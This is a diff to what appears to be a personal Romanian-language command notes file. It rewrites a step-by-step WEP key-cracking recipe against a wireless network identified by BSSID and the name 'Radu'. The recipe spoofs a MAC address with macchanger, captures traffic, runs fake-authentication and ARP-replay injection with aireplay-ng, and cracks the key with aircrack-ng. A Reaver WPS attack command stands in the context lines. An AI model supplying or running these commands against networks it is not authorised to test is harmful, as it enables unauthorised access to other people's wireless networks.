@@ -1379,25 +1379,24 @@ airmon-ng start wlan0  # (monitor mode enabled on mon0)
 airodump-ng mon0  #afiseaza BSSID-urile retelelor wireless
 reaver -i mon0 -b [BSSID] -vv
 
-# pentru WEP #
-airmon-ng
+# pentru WEP  (exemplu Radu, channel 6, BSSID 00:1A:C1:35:B7:66)#
 airmon-ng stop wlan0
-airmon-ng start wlan0  # (monitor mode enabled on mon0)
+iwconfig wlan0 channel 6
+ifconfig wlan0 down
+macchanger --mac 00:11:22:33:44:55 wlan0
+airmon-ng start wlan0 6
 
+airodump-ng wlan0   # to find BSSID
 
-airodump-ng mon0  #afiseaza BSSID-urile retelelor wireless
-airodump-ng -w wep -c [channel number] --bbsid [BBSID number] wlan0
+airodump-ng -c 6 -w Radu --bssid 00:1A:C1:35:B7:66 wlan0
 
-se deschide  o consola noua:
-aireplay-ng -1 0 -a [BSSID] wlan0
+aireplay-ng -1 0 -a 00:1A:C1:35:B7:66 -h 00:11:22:33:44:55 -e Radu wlan0
 
-se deschide  o consola noua:
-airplay-ng -3 -b [BSSID] wlan0
+aireplay-ng -3 -b 00:1A:C1:35:B7:66 -h 00:11:22:33:44:55 wlan0
+# se lasa aprox. 1 ora pana ajunge traficul in prima consola data > 30.000, ctrl+c la consola cu sending and reciveing data
 
-se lasa aprox. 1 ora pana ajunge traficul in prima consola data > 30.000
-ctrl+c la consola cu sending and reciveing data 
-se cauta ~/[filename].cap
-aircrack-ng [filename].cap
+aircrack-ng -b 00:1A:C1:35:B7:66 Radu-01.cap  
+
 
 
 ### Pixart Imaging, Inc. Q-TEC WEBCAM 100 ###
